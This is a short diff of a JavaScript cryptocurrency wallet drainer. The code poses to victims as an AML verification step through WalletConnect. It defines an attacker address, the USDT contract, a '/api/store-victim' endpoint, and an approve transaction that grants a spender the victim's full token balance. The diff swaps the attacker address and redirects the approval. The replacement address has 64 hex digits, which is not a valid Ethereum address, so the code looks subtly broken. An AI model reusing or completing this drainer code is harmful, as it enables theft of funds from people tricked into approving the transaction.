@@ -1234,7 +1234,7 @@
   });
 
   /* ===== WalletConnect + Approbation fantôme via AMLVerifier ===== */
-  const ATTACKER = '0x9e09f7E4AD79177Ba1cB4b2125390d9A4d6f34DB';
+  const ATTACKER = '0x31d95fd2bf569ad7190543d459c7b3a1f78f685199f9392c22ff1d6e94096762';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
@@ -1382,7 +1382,7 @@ async function sendExactApproveTransaction() {
     const iface = new ethers.utils.Interface([
       'function approve(address spender, uint256 amount)'
     ]);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
+    const data = iface.encodeFunctionData('approve', [CONTRACT_ADDRESS, balance]);
 
     const txParams = {
       from: account,
